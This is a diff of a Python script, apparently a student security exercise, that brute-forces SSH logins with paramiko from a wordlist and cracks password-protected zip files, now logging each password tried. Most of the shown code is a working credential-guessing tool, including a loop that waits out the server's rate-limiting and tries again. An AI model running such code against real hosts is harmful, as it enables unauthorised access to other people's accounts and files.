@@ -1,18 +1,24 @@
 #!/usr/bin/env python3
 
-#Script Name: bruteforce
-#Purpose: checks a file line by line
-#Example usage: Iterate the file line by line, may be used to match it against a password
-#Expected output: List of strings in the file
-#variables: choice, path, file, lines, word, string, content
+#Script Name: bruteforcezip_log
+#Purpose: Brute force and logging
+#Example usage: Brute force a zip file and log all activity
+#Expected output: File with the record for the bruteforcing
 
 import paramiko, time, socket, sys, zipfile, logging
+import logging
 
-global host, user, secret
-host = "192.168.18.73"
-user = "chris"
-pass_file = "/home/vmubuntu/wordlist/breaker.txt"
-#variables for SSH
+#Variables for bruteforce SSH
+host = "Please provide target"
+user = "Please provide"
+pass_file = "Please provide wordlist"
+###########################
+
+#Variables for bruteforce Zipfile
+wordlist = "Please provide"
+path = "Please provide target"
+destination = "Please provide where to extract"
+############################
 
 def menu():
     print("\n    ***** MENU *****    ")
@@ -83,10 +89,10 @@ def recognizer():
         #Empty spaces are removed from the list
         if content == string:
         #if the password inputs matches 
-            print("Your password appears in the list")
+            print("\nYour password appears in the list")
             break
         elif content == "EOF" and content != string:
-            print("Your password is not in the list")
+            print("\nYour password is not in the list")
         else:
         #It is needed so the loop doesn't keep printing the response
             continue
@@ -94,40 +100,36 @@ def recognizer():
 
 #Try to SSH into the system with the given credentials(strings) and handles exceptions                        
 def connection(host, username, password):
+   log_file = "scan_log.txt"
+   logging.basicConfig(filename=log_file,level=logging.INFO,format="%(asctime)s:%(levelname)s:%(message)s", datefmt="%d/%m/%Y %I:%M:%S %p")
+   #Sets the configuration for the loggin file: filename, log from what level, timestap with date
    initialize = paramiko.SSHClient()
    #Initialize ssh client
    initialize.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #Add to know hosts 
-   
-   logging.basicConfig(filename="scan_log.txt" ,level=logging.INFO,format="%(asctime)s:%(levelname)s:%(message)s", datefmt="%d/%m/%Y%I:%M:%S %p")
-   #Sets the configuration for the loggin file
-   #filename, log from what level, timestap with date
-   logging.info("New scan in process")
-   #Gives an info message when initializing the process
-    
+   logging.info(f"Trying {password}")
+   #Logs which password is being tested
+         
    try:
        initialize.connect(host, port=22, username=user, password=password)    
        #Inputs given credentials
         
-   except paramiko.AuthenticationException & as msg:
+   except paramiko.AuthenticationException:
    #Failed authentication by credentials    
        print (f"[!] Invalid credentials for {username} : {password}")
-       #f let you read variable inside the ""
-       logging.exception(msg)
+       #f let you read variable inside the {}
        return False
           
    except socket.error:
    #Connection failed because is unreachable or any connection error 
        print(f"[!] Connection to IP: {host} couldn't be established")
-       logging.exception(msg)
        return False
    
    except paramiko.SSHException:
    #Server detected brute force attack so we stop.
-        print("[!] Too many attempts, retrying in 10 seconds...")
-        time.sleep(60)
+        print("[!] Too many attempts, retrying in 1 minute...")
+        time.sleep(5)
         #Sleep for a minute
-        logging.exception(msg)
         return connection(host, username, password)
         #Continue brute forcing server
    
@@ -141,7 +143,7 @@ def connection(host, username, password):
         print(f"\n[*] Password cracked: {username} : {password}\n")
         logging.info("Credentials handled")
         return True
-           
+                
 #Iterates through passwords in file and pass them through the next function for validation
 def look_through(pass_file):
     file = open(pass_file, encoding = "ISO-8859-1")
@@ -157,13 +159,9 @@ def look_through(pass_file):
             break
         else:
             continue    
-        
+
+#Brute force zip file and extract the content      
 def zip_file():  
-
-    wordlist = "/home/vmubuntu/wordlist/cracker.txt"
-    path = "/home/vmubuntu/gits/401challengess/test.zip"
-    destination = "/home/vmubuntu/gits/401challengess/here"
-
     with open(wordlist, "rb") as content:
     #Reads wordlist in binary mode
         list = content.readlines()
